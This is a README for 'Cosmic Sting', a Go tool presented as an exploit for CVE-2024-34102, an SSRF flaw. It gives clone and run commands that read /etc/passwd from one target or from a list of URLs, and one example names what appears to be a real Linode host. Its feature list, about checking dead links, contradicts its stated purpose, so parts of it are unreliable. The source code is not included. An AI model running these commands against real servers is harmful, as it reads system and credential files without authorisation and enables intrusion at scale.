# Cosmic Sting: CVE-2024-34102 Exploiter

Cosmic Sting is a Go-based tool designed to exploit CVE-2024-34102, an SSRF vulnerability. The tool checks multiple URLs provided either directly or via a file, collects links from the source code, checks if the collected links are alive or dead, and saves dead links to an output file.

## Features

- Check a single URL or multiple URLs for vulnerabilities.
- Collect and check links from the source code.
- Outputs the results in a structured format.

## Prerequisites

- Go (1.16 or higher)

## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/yourusername/cosmic_sting.git
    cd cosmic_sting
    ```

2. Install dependencies (if any):
    ```sh
    go mod tidy
    ```

## Usage

You can run the tool with either a single URL or a list of URLs.

### Single URL

To run the tool with a single URL:

```sh
go run cosmic_sting.go -u "http://example.com" -f "/etc/passwd"
```

### Multiple URLs

To run the tool with a list of URLs:

1. Create a file `urls.txt` containing the URLs you want to check, one per line:
    ```
    http://example1.com
    http://example2.com
    http://example3.com
    ```

2. Run the tool with the list of URLs:
    ```sh
    go run cosmic_sting.go -l urls.txt -f "/etc/passwd"
    ```

## Flags

- `-u`, `--url` : Single URL to exploit.
- `-f`, `--file` : File to read via SSRF.
- `-l`, `--list` : File containing list of URLs to exploit.

## Examples

To check a single URL:
```sh
go run cosmic_sting.go -u "http://23-239-26-219.ip.linodeusercontent.com" -f "/etc/passwd"
```

To check multiple URLs from a file:
```sh
go run cosmic_sting.go -l urls.txt -f "/etc/passwd"
```
